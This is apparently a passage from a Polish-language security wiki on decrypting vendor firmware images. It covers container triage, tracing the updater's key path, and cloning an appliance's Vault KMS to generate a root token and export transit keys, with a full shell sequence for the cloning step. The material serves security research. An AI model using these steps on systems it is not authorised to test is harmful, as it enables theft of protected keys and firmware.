Gdy obraz aktualizacji łączy niewielką ilość metadanych w plaintext z dużym blobem o wysokiej entropii, przed rozpoczęciem brute-force wykonaj triage kontenera:<sup>[[1]](#references)</sup>

- Zrzuć nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` oraz `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: kolejne 8 bajtów to salt, a pozostałe bajty to ciphertext.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, jest silną wskazówką, że masz do czynienia z ciphertextem RSA-2048 opakowującym losowe hasło firmware/klucz sesji.
- Odłączony materiał PGP w tym samym pliku często zapewnia wyłącznie autentyczność; nie zakładaj, że jest mechanizmem zapewniającym poufność.

Jeśli statyczne wyszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przynosi rezultatów, odtwórz **operacyjną ścieżkę deszyfrowania**, zamiast szukać wyłącznie kluczy prywatnych:

- Zdekompiluj updater / binarkę zarządzającą i prześledź, kto odczytuje zaszyfrowany blob, który helper/API go rozwija oraz jakiej logicznej nazwy klucza żąda.
- Przeszukaj wyodrębniony root filesystem pod kątem stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), a także plików unit i skryptów init.
- Traktuj jawne polecenia `vault operator unseal ...`, klucze recovery, tokeny bootstrap lub lokalne skrypty auto-unseal KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli appliance zawiera oryginalną binarkę Vault i backend storage, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowna implementacja mechanizmów wewnętrznych Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Z uprawnieniami root w sklonowanym KMS:

- Spraw, aby klucze tranzytowe były eksportowalne wyłącznie wewnątrz izolowanego klona: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Przetestuj odzyskany klucz RSA z dokładną parą padding/hash używaną przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 i nieudane domyślne odszyfrowanie OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez vendora (`EVP_BytesToKey`, często MD5 w starszych appliance'ach), zanim spróbujesz odszyfrowania AES-CBC.

Zmienia to problem „zaszyfrowanego firmware'u” w bardziej ogólny problem: **odzyskaj klucze operacyjne po stronie appliance'a, a następnie odtwórz offline dokładne parametry unwrap + KDF**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware with Claude: Umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodyka testowania bezpieczeństwa firmware'u](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczny hacking IoT: Kompletny przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 dolarów dało mi dostęp do twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz widzisz mi: teraz jesteś Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Wykorzystywanie Tesla Wall Connector przez złącze portu ładowania - część 2: omijanie ochrony przed downgrade'em](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Eksploatacja mostka Philips Hue przez OTA](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
